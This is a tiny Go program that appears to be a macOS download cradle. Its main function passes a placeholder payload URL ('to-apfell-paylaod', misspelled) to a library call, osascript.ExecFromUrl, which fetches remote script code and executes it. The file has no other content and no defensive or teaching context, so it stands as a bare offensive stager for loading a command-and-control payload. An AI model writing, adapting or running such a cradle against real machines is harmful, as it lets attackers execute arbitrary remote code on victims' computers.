package main

import "github.com/grines/go-cradle/lib/osascript"

func main() {

	Run_url("https://to-apfell-paylaod")
}

func Run_url(url string) string {
	result := osascript.ExecFromUrl(url)
	return result
}
